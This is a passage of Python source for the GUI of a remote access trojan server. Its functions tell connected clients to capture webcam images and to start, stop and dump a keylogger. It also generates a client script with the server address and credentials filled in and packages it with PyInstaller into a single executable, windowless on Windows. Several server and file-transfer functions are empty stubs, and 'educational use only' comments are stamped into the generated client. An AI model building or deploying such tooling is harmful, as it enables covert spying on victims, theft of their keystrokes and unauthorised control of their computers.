    def capture_webcam(self):
        """Send command to capture webcam image"""
        if not current_client:
            self.log_message("No client selected", "error")
            return
        
        self.log_message("Requesting webcam capture...", "info")
        self.webcam_status_var.set("Capturing webcam image...")
        
        # Send webcam command to client
        self.secure_send(current_client["socket"], "webcam")
        
        # Response will be handled by the command processor
    
    def save_webcam_image(self):
        """Save the current webcam image to disk"""
        if not self.webcam_images or self.current_webcam_index >= len(self.webcam_images):
            self.log_message("No webcam image to save", "error")
            return
        
        save_path = filedialog.asksaveasfilename(
            defaultextension=".jpg",
            filetypes=[("JPEG Files", "*.jpg"), ("All Files", "*.*")]
        )
        
        if save_path:
            try:
                self.webcam_images[self.current_webcam_index].save(save_path)
                self.log_message(f"Webcam image saved to {save_path}", "success")
            except Exception as e:
                self.log_message(f"Error saving webcam image: {e}", "error")
    
    def prev_webcam_image(self):
        """Navigate to previous webcam image"""
        if not self.webcam_images:
            return
            
        self.current_webcam_index = (self.current_webcam_index - 1) % len(self.webcam_images)
        self.display_webcam_image()
    
    def next_webcam_image(self):
        """Navigate to next webcam image"""
        if not self.webcam_images:
            return
            
        self.current_webcam_index = (self.current_webcam_index + 1) % len(self.webcam_images)
        self.display_webcam_image()
    
    def display_webcam_image(self):
        """Display the current webcam image"""
        if not self.webcam_images or self.current_webcam_index >= len(self.webcam_images):
            return
        
        image = self.webcam_images[self.current_webcam_index]
        
        # Resize to fit the canvas while preserving aspect ratio
        canvas_width = self.webcam_canvas.winfo_width()
        canvas_height = self.webcam_canvas.winfo_height()
        
        if canvas_width > 50 and canvas_height > 50:  # Ensure canvas has a reasonable size
            img_width, img_height = image.size
            
            # Calculate scaling factor to fit in canvas
            scale = min(canvas_width / img_width, canvas_height / img_height)
            
            # Resize image
            new_width = int(img_width * scale)
            new_height = int(img_height * scale)
            resized_img = image.resize((new_width, new_height), Image.LANCZOS)
            
            # Convert to PhotoImage and display
            photo = ImageTk.PhotoImage(resized_img)
            self.webcam_image = photo  # Keep a reference to prevent garbage collection
            
            # Clear canvas and display image
            self.webcam_canvas.delete("all")
            self.webcam_canvas.create_image(
                canvas_width // 2, canvas_height // 2, 
                image=photo, 
                anchor="center"
            )
            
            # Update the label
            self.webcam_label.config(
                text=f"Image {self.current_webcam_index + 1} of {len(self.webcam_images)}"
            )
    
    # Keylogger functions
    def start_keylogger(self):
        """Send command to start keylogger on client"""
        if not current_client:
            self.log_message("No client selected", "error")
            return
        
        self.log_message("Starting keylogger on client...", "info")
        self.keylogger_status_var.set("Keylogger starting...")
        
        # Send keylogger start command to client
        self.secure_send(current_client["socket"], "keylogger_start")
        
        # Response will be handled by the command processor
    
    def stop_keylogger(self):
        """Send command to stop keylogger on client"""
        if not current_client:
            self.log_message("No client selected", "error")
            return
        
        self.log_message("Stopping keylogger on client...", "info")
        self.keylogger_status_var.set("Keylogger stopping...")
        
        # Send keylogger stop command to client
        self.secure_send(current_client["socket"], "keylogger_stop")
        
        # Response will be handled by the command processor
    
    def dump_keylogger(self):
        """Send command to retrieve keylogger data from client"""
        if not current_client:
            self.log_message("No client selected", "error")
            return
        
        self.log_message("Retrieving keylogger data...", "info")
        self.keylogger_status_var.set("Retrieving keylog data...")
        
        # Send keylogger dump command to client
        self.secure_send(current_client["socket"], "keylogger_dump")
        
        # Response will be handled by the command processor
    
    def save_keylogger_data(self):
        """Save keylogger data to a file"""
        data = self.keylogger_text.get("1.0", tk.END)
        if not data.strip():
            self.log_message("No keylogger data to save", "error")
            return
        
        save_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        
        if save_path:
            try:
                with open(save_path, "w") as f:
                    f.write(data)
                self.log_message(f"Keylogger data saved to {save_path}", "success")
            except Exception as e:
                self.log_message(f"Error saving keylogger data: {e}", "error")
    
    def update_status_indicator(self, status="idle"):
        """Update the visual status indicator"""
        self.status_indicator.delete("indicator")
        
        if status == "idle":
            # Red indicator - not running
            color = self.error_color
            self.status_var.set("Server: Stopped")
        elif status == "listening":
            # Yellow indicator - listening but no clients
            color = self.warning_color
            self.status_var.set(f"Server: Running on {self.server_host.get()}:{self.server_port.get()}")
        elif status == "connected":
            # Green indicator - clients connected
            color = self.success_color
            self.status_var.set(f"Server: Running with clients")
        
        # Draw the indicator
        self.status_indicator.create_oval(2, 2, 18, 18, fill=color, tags="indicator")
        
        # Update client count
        client_count = len(clients)
        self.client_count_var.set(f"Clients: {client_count}")
        
        # If we now have clients, update status
        if status == "listening" and client_count > 0:
            self.update_status_indicator("connected")

    # Placeholder method stubs for functionality
    def log_message(self, message, level="info"):
        self.console_output.config(state="normal")
        
        if level == "info":
            tag = "info"
            prefix = "[INFO] "
            color = self.text_color
        elif level == "success":
            tag = "success"
            prefix = "[SUCCESS] "
            color = self.success_color
        elif level == "warning":
            tag = "warning"
            prefix = "[WARNING] "
            color = self.warning_color
        elif level == "error":
            tag = "error"
            prefix = "[ERROR] "
            color = self.error_color
        
        self.console_output.tag_config(tag, foreground=color)
        self.console_output.insert(tk.END, f"{prefix}{message}\n", tag)
        self.console_output.see(tk.END)
        self.console_output.config(state="disabled")
    
    def start_server(self):
        """Start the RAT server"""
        self.log_message("Starting server...", "info")
        
        # Get the current IP configuration
        local_ip = self.get_local_ip()
        
        # Update status indicator
        self.update_status_indicator("listening")
        
        # Check if trying to use 127.0.0.1 with LAN mode
        if self.lan_mode_var.get() and (self.server_host.get() in ['127.0.0.1', 'localhost']):
            self.log_message("Warning: Using localhost with LAN mode enabled may cause connection issues", "warning")
            self.log_message("Consider using 0.0.0.0 to listen on all interfaces", "warning")
        
        # Placeholder for actual server implementation
        self.status_var.set(f"Server: Running on {self.server_host.get()}:{self.server_port.get()}")
        self.log_message(f"Server listening on {self.server_host.get()}:{self.server_port.get()}", "success")
        
        # Show all detected IPs for user reference
        ip_info = self.get_all_ip_info()
        self.log_message(f"Your hostname: {ip_info['hostname']}", "info")
        self.log_message(f"Your local IP address: {local_ip}", "info")
        
        if self.server_host.get() == "0.0.0.0":
            self.log_message("Server is listening on all network interfaces", "info")
            self.log_message(f"Clients should connect to one of:", "info")
            
            # List all possible IPs clients could use
            self.log_message(f"  • {local_ip} (recommended for LAN)", "info")
            
            for ip in ip_info['local_ips']:
                if ip != local_ip and not ip.startswith("127."):
                    self.log_message(f"  • {ip}", "info")
            
            self.log_message(f"  • 127.0.0.1 (only for clients on this machine)", "info")
        
        self.start_server_btn.config(state="disabled")
        self.stop_server_btn.config(state="normal")
        
        # Start connectivity checker in a separate thread
        self.connection_monitor_thread = threading.Thread(
            target=self.check_server_connectivity, 
            daemon=True
        )
        self.connection_monitor_thread.start()
        
        # Auto-generate client if option is enabled
        if self.auto_generate_var.get():
            ip_to_use = local_ip if self.lan_mode_var.get() else "127.0.0.1"
            if self.generate_client_script(ip_to_use, self.server_port.get()):
                self.client_generated = True
                self.log_message("client_gen.py generated automatically", "success")
                
                # Build executable if option is selected
                if self.build_exe_var.get():
                    if self.build_client_executable():
                        self.log_message("Executable built automatically", "success")
    
    def stop_server(self):
        """Stop the RAT server"""
        self.log_message("Stopping server...", "info")
        
        # Update status indicator
        self.update_status_indicator("idle")
        
        # Placeholder for actual server stop implementation
        self.status_var.set("Server: Stopped")
        self.log_message("Server stopped", "warning")
        self.start_server_btn.config(state="normal")
        self.stop_server_btn.config(state="disabled")
    
    def on_closing(self):
        """Handle window closing event"""
        if messagebox.askokcancel("Exit", "Are you sure you want to exit?"):
            if self.server:
                self.stop_server()
            self.root.destroy()
    
    def process_responses(self):
        """Process responses from clients"""
        # Placeholder for actual implementation
        pass
    
    # Placeholder method stubs for other functionality
    def refresh_clients(self): pass
    def connect_to_client(self): pass
    def disconnect_client(self): pass
    def send_command(self, event=None): pass
    def browse_local_dir(self): pass
    def refresh_local_files(self): pass
    def list_remote_files(self): pass
    def upload_file(self): pass
    def download_file(self): pass
    def delete_remote_file(self): pass
    def capture_screenshot(self): pass
    def save_screenshot(self): pass
    def prev_screenshot(self): pass
    def next_screenshot(self): pass
    def get_system_info(self): pass
    def export_system_info(self): pass
    def save_settings(self): pass
    def reset_settings(self): pass

    def get_local_ip(self):
        """Get the local IP address of the machine based on settings"""
        ip_info = self.get_all_ip_info()
        
        # If LAN mode is enabled, use the primary IP
        if self.lan_mode_var.get():
            return ip_info['primary_ip']
        else:
            # Otherwise use localhost for single-machine testing
            return "127.0.0.1"
    
    def get_all_ip_info(self):
        """Get all IP information for this machine"""
        ip_info = {
            'hostname': socket.gethostname(),
            'local_ips': [],
            'primary_ip': '127.0.0.1'  # Default fallback
        }
        
        # Get all IPs
        try:
            # Method 1: Get all IPs associated with hostname
            host_info = socket.gethostbyname_ex(socket.gethostname())
            if host_info and len(host_info) >= 3:
                ip_info['local_ips'].extend(host_info[2])
        except:
            pass
            
        # Method 2: Scan network interfaces (more reliable)
        try:
            for interface in socket.getaddrinfo(socket.gethostname(), None):
                ip = interface[4][0]
                # Only include IPv4 addresses and filter out loopback
                if "." in ip and not ip.startswith("127."):
                    if ip not in ip_info['local_ips']:
                        ip_info['local_ips'].append(ip)
        except:
            pass
        
        # Method 3: Use UDP socket method
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            udp_ip = s.getsockname()[0]
            s.close()
            if udp_ip not in ip_info['local_ips']:
                ip_info['local_ips'].append(udp_ip)
            # This is usually the most reliable method for external connectivity
            ip_info['primary_ip'] = udp_ip
        except:
            pass
        
        # If no IPs found, add localhost
        if not ip_info['local_ips']:
            ip_info['local_ips'].append('127.0.0.1')
        
        return ip_info
    
    def check_server_connectivity(self):
        """Monitor server for incoming connections and provide warnings if none detected"""
        # Désactivation complète de la vérification du délai d'attente
        # On laisse seulement le code pour mettre à jour l'indicateur de statut si des clients se connectent
        
        while not stop_flag:
            if len(clients) > 0:
                self.update_status_indicator("connected")
                break
            time.sleep(1)
            
        # Toutes les autres vérifications ont été supprimées
    
    def generate_client_script(self, ip, port):
        """Generate client script with the correct server IP and port"""
        try:
            # Check if client_template.py exists
            if not os.path.exists("client_template.py"):
                # If not, use the current client.py as template
                if os.path.exists("client.py"):
                    shutil.copy("client.py", "client_template.py")
                    self.log_message("Created client_template.py from client.py", "info")
                else:
                    self.log_message("No client template found. Please create client_template.py", "error")
                    return False
            
            # Read the template file
            with open("client_template.py", 'r', encoding='utf-8') as template_file:
                template_content = template_file.read()
            
            # Replace the SERVER_HOST and SERVER_PORT values
            template_content = re.sub(r'SERVER_HOST\s*=\s*["\'].*["\']', 
                                   f'SERVER_HOST = "{ip}"', template_content)
            template_content = re.sub(r'SERVER_PORT\s*=\s*\d+', 
                                   f'SERVER_PORT = {port}', template_content)
            
            # Replace authentication settings
            template_content = re.sub(r'AUTH_USERNAME\s*=\s*["\'].*["\']',
                                   f'AUTH_USERNAME = "{self.auth_username_var.get()}"', template_content)
            template_content = re.sub(r'AUTH_PASSWORD\s*=\s*["\'].*["\']',
                                   f'AUTH_PASSWORD = "{self.auth_password_var.get()}"', template_content)
            
            # Add ethical warning at the top of the file without emoji character
            ethical_warning = (
                "#!/usr/bin/env python3\n"
                "# WARNING: Ce projet est a but pedagogique uniquement. Toute utilisation non autorisee est strictement interdite.\n"
                "# AUTOMATICALLY GENERATED CLIENT - EDUCATIONAL PURPOSES ONLY\n"
                "# WARNING: Educational use only - Unauthorized deployment is illegal.\n"
                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n"
                "# Server IP: " + ip + " | Port: " + str(port) + "\n\n"
            )
            
            # Add test_connection function to client if it doesn't already have one
            if "def test_connection(" not in template_content:
                connection_test_code = '''
# Connection testing function
def test_connection(host, port):
    """Test connectivity to the server and provide diagnostic information"""
    print(f"\\n[*] Testing connection to {host}:{port}...")
    
    # First, check if we can ping the host
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', host]
    try:
        ping_result = subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if ping_result != 0:
            print(f"[!] Cannot ping {host}. Host may be down or not accepting ICMP packets.")
    except:
        pass
    
    # Check if we're trying to connect to localhost from possibly another machine
    is_local_ip = False
    try:
        ip_obj = ipaddress.ip_address(host)
        is_local_ip = ip_obj.is_loopback
    except:
        if host in ["localhost", "127.0.0.1"]:
            is_local_ip = True
    
    if is_local_ip:
        print("[!] Using localhost/127.0.0.1 - this only works if client and server are on the same machine")
        print("[!] For different machines, the server needs to use its LAN IP address")
    
    # Test TCP connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        print("[+] Connection successful! Server is reachable.")
        return True
    except ConnectionRefusedError:
        print("[!] Connection refused. The server is not running or is blocking connections.")
        print("[!] Troubleshooting steps:")
        print("    1. Make sure the server is running")
        print("    2. Check that the server IP and port are correct")
        print("    3. Check Windows Firewall settings and allow Python in the rules")
        print(f"    4. Verify the port {port} is not blocked")
        return False
    except socket.timeout:
        print("[!] Connection timed out. The server might be:")
        print("    1. Behind a firewall")
        print("    2. On a different network segment")
        print("    3. IP address might be incorrect")
        return False
    except socket.gaierror:
        print(f"[!] Address error. Unable to resolve hostname {host}")
        print("    Please use an IP address instead of a hostname")
        return False

'''
                # Find a suitable place to insert the function
                # Look for import statements to add the required ipaddress module
                if "import ipaddress" not in template_content:
                    template_content = re.sub(
                        r'(import.*?$)',
                        r'\1\nimport ipaddress',
                        template_content,
                        count=1,
                        flags=re.MULTILINE
                    )
                
                # Insert the test function before the main function
                if "def main(" in template_content:
                    template_content = re.sub(
                        r'(def main\(.*?\):)',
                        connection_test_code + r'\1',
                        template_content,
                        flags=re.DOTALL
                    )
                else:
                    # If no main function, add it to the end
                    template_content += "\n" + connection_test_code
            
            # Add connection test call at the beginning of main() function
            if "def main(" in template_content and "test_connection(SERVER_HOST, SERVER_PORT)" not in template_content:
                template_content = re.sub(
                    r'(def main\(.*?\):.*?)(\s+.*?while True:)',
                    r'\1\n    # Test connectivity first\n    test_connection(SERVER_HOST, SERVER_PORT)\2',
                    template_content,
                    flags=re.DOTALL
                )
            
            # If there's already a shebang line, replace it rather than adding a new one
            if template_content.startswith("#!/"):
                template_content = re.sub(r'^#!.*\n', ethical_warning, template_content)
            else:
                template_content = ethical_warning + template_content
            
            # Write the generated client file with UTF-8 encoding
            with open("client_gen.py", 'w', encoding='utf-8') as client_file:
                client_file.write(template_content)
            
            self.log_message(f"Generated client_gen.py with server: {ip}:{port}", "success")
            
            # Add advice about the IP configuration based on what was used
            if ip == "127.0.0.1" or ip == "localhost":
                self.log_message("Using localhost (127.0.0.1) - client and server must be on the same machine", "warning")
            elif ip == "0.0.0.0":
                self.log_message("Using 0.0.0.0 is not valid for client connections", "error")
                self.log_message("Please use a specific IP address like your LAN IP", "error")
                # Fix by using a proper IP
                ip_info = self.get_all_ip_info()
                return self.generate_client_script(ip_info['primary_ip'], port)
            
            return True
            
        except Exception as e:
            self.log_message(f"Error generating client: {str(e)}", "error")
            return False
    
    def build_client_executable(self):
        """Build an executable from the generated client script"""
        if not os.path.exists("client_gen.py"):
            self.log_message("client_gen.py not found. Generate it first.", "error")
            return False
        
        try:
            # Create 'dist' directory if it doesn't exist
            if not os.path.exists("dist"):
                os.makedirs("dist")
            
            # Create builds/clients directory if save_to_builds is enabled
            if self.save_to_builds_var.get():
                builds_dir = os.path.join("builds", "clients")
                if not os.path.exists(builds_dir):
                    os.makedirs(builds_dir)
            
            # Check if PyInstaller is installed
            try:
                # Try to directly import PyInstaller to check if it's installed
                import importlib
                pyinstaller_spec = importlib.util.find_spec("PyInstaller")
                if pyinstaller_spec is None:
                    raise ImportError("PyInstaller not found")
                
                self.log_message("PyInstaller is installed and available", "info")
            except ImportError:
                self.log_message("PyInstaller not found. Installing...", "warning")
                try:
                    # Install PyInstaller using pip
                    pip_cmd = [sys.executable, "-m", "pip", "install", "pyinstaller"]
                    self.log_message(f"Running: {' '.join(pip_cmd)}", "info")
                    result = subprocess.run(pip_cmd, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        self.log_message("PyInstaller installed successfully", "success")
                    else:
                        self.log_message(f"Failed to install PyInstaller: {result.stderr}", "error")
                        return False
                except Exception as e:
                    self.log_message(f"Error installing PyInstaller: {e}", "error")
                    return False
            
            # Build the executable
            self.log_message("Building executable with PyInstaller...", "info")
            
            # Determine output directory
            dist_path = os.path.join("builds", "clients") if self.save_to_builds_var.get() else "./dist"
            
            # Add timestamp to output filename
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            output_name = f"client_rat_{timestamp}"
            
            # Use correct PyInstaller options based on platform
            is_windows = platform.system() == "Windows"
            
            # Create the PyInstaller command
            pyinstaller_cmd = [
                sys.executable, 
                "-m", 
                "PyInstaller",
                "--onefile",
            ]
            
            # Add noconsole option only on Windows
            if is_windows:
                pyinstaller_cmd.append("--noconsole")
                
            # Add remaining options
            pyinstaller_cmd.extend([
                f"--distpath={dist_path}",
                "--workpath=./build",
                "--specpath=./build",
                f"--name={output_name}",
                "client_gen.py"
            ])
            
            # Log the command being executed
            self.log_message(f"Running: {' '.join(pyinstaller_cmd)}", "info")
            
            # Run the PyInstaller command
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Determine the correct file extension
                ext = ".exe" if is_windows else ""
                output_path = os.path.join(dist_path, f"{output_name}{ext}")
                
                self.log_message(f"Executable built successfully: {output_path}", "success")
                
                # Show message with link
                exe_path = os.path.abspath(output_path)
                self.log_message(f"Client executable path: {exe_path}", "info")
                
                # Show success message box with path
                messagebox.showinfo("Build Successful", 
                                  f"Client executable built successfully:\n\n{exe_path}")
                
                return True
            else:
                self.log_message(f"Error building executable: {result.stderr}", "error")
                # Add more detailed error information
                if "ImportError" in result.stderr:
                    self.log_message("Try installing PyInstaller manually: pip install pyinstaller", "warning")
                return False
                
        except Exception as e:
            self.log_message(f"Error building executable: {str(e)}", "error")
            return False
    
    def manual_generate_client(self):
        """Generate client script manually from the Settings tab"""
        # Determine the correct IP based on settings
        ip = self.get_local_ip() if self.lan_mode_var.get() else "127.0.0.1"
        port = self.server_port.get()
        
        if self.generate_client_script(ip, port):
            self.client_generated = True
            messagebox.showinfo("Success", f"client_gen.py generated successfully with IP: {ip}, Port: {port}")
            
            # Build executable if option is selected
            if self.build_exe_var.get():
                if self.build_client_executable():
                    pass  # Success message already shown in build_client_executable
        else:
            messagebox.showerror("Error", "Failed to generate client. Check the logs.")
    
    def show_ip_info(self):
        """Display all detected IP addresses"""
        ip_info = self.get_all_ip_info()
        ip_message = "IP Information:\n\n"
        
        ip_message += f"Hostname: {ip_info['hostname']}\n\n"
        ip_message += "Local IPs:\n"
        for i, ip in enumerate(ip_info['local_ips']):
            ip_message += f"  {i+1}. {ip}\n"
        
        ip_message += "\nLoopback: 127.0.0.1\n"
        ip_message += "\nRecommended for:\n"
        ip_message += f"  • Same machine testing: 127.0.0.1\n"
        ip_message += f"  • LAN testing: {ip_info['primary_ip']}\n"
        ip_message += f"  • All interfaces: 0.0.0.0\n\n"
        ip_message += "Note: Using 0.0.0.0 listens on all interfaces but client needs a specific IP."
        
        messagebox.showinfo("IP Information", ip_message)
    
    def test_port(self):
        """Test if the specified port is available"""
        port = self.server_port.get()
        
        try:
            # Try to create a socket and bind to the port
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(1)
            test_socket.bind(('0.0.0.0', port))
            test_socket.listen(1)
            test_socket.close()
            messagebox.showinfo("Port Test", f"Port {port} is available and not blocked.")
        except socket.error as e:
            if e.errno == 10048:  # Address already in use
                messagebox.showerror("Port Test", f"Port {port} is already in use by another application.")
            else:
                messagebox.showerror("Port Test", f"Port {port} test failed: {str(e)}")

# Main function to start the application
if __name__ == "__main__":
    # Create necessary directories
    os.makedirs("dist", exist_ok=True)
    os.makedirs(os.path.join("builds", "clients"), exist_ok=True)
    
    # Check for required modules
    required_modules = {
        "PIL/Pillow": "PIL",
        "PyAutoGUI": "pyautogui",
        "OpenCV (optional)": "cv2",
        "pynput (optional)": "pynput"
    }
    
    print("Checking for required modules:")
    for name, package in required_modules.items():
        try:
            __import__(package)
            print(f"  ✅ {name} is installed")
        except ImportError:
            if name == "PIL/Pillow":
                print(f"  ❌ {name} is not installed. Install with: pip install pillow")
            elif name == "OpenCV (optional)":
                print(f"  ❌ {name} is not installed. Install with: pip install opencv-python")
            else:
                print(f"  ❌ {name} is not installed. Install with: pip install {package}")
    print()
    
    # Start the application
    root = tk.Tk()
    app = RATServerGUI(root)
    
    try:
        root.mainloop()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1) 